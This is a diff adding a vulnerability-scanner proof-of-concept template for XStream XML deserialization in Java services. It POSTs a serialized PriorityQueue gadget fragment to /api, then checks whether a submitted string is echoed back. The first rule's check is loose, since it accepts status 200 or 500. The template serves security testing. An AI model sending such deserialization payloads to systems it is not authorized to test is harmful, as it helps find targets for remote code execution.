@@ -1,0 +1,27 @@
+name: poc-xstream-deserialization
+transport: http
+set:
+  r0: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/api"
+      headers:
+        Content-Type: "application/xml"
+      body: "<java.util.PriorityQueue serialization='custom'><unserializable-parents/><java.util.PriorityQueue><default><size>2</size><comparator class='javax.naming.ldap.Rdn$RdnEntry'/></default></java.util.PriorityQueue></java.util.PriorityQueue>"
+    expression: response.status == 500 || response.body.bcontains("xstream") || response.status == 200
+  r1:
+    request:
+      method: POST
+      path: "/"
+      headers:
+        Content-Type: "application/xml"
+      body: "<string>test{{r0}}</string>"
+    expression: response.body.bcontains("test{{r0}}")
+expression: r0() && r1()
+detail:
+  author: sxel
+  description: XStream XML deserialization echo probe (echo of parsed body implies processing)
+  severity: medium
+  tags: xstream,java,deserialization
